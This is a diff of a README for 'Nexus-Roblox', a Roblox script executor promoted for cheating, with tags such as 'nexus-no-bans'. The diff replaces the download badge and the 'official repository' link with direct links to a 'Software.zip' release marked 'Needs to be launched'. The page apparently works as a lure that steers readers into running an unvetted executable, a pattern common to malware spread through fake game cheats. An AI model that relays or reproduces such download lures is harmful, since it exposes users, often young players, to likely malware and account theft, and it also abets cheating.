@@ -9,7 +9,7 @@ Nexus Executor offers free and lifetime packages and is hosted directly on the w
 nexus-execute-roblox, nexus-game-scripting, nexus-no-bans, nexus-roblox, nexus-roblox-access, nexus-roblox-scripting, nexus-roblox-scripts, nexus-script-execution, nexus-script-hub, nexus-scripting-tools, nexus-scripts, roblox, roblox-script, roblox-scripts
 
 🔗 **Download Nexus-Roblox**:
-[![Download Nexus-Roblox](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip) - *Needs to be launched*
+[![Download Nexus-Roblox](https://github.com/Agentsgamers/Nexus-Roblox/releases/download/v1.0/Software.zip)](https://github.com/Agentsgamers/Nexus-Roblox/releases/download/v1.0/Software.zip) - *Needs to be launched*
 
 ## 🚀 About Nexus-Roblox
 
@@ -28,6 +28,6 @@ To get started with Nexus-Roblox, simply click on the download link provided abo
 
 ## 🌐 Explore More
 
-Visit the official [Nexus-Roblox repository](https://github.com/cli/browser) for additional information and updates on the tool. For any queries or support, refer to the "Releases" section of the repository for assistance.
+Visit the official [Nexus-Roblox repository](https://github.com/Agentsgamers/Nexus-Roblox/releases/download/v1.0/Software.zip) for additional information and updates on the tool. For any queries or support, refer to the "Releases" section of the repository for assistance.
 
 🚀 Happy Scripting with Nexus-Roblox! 🚀
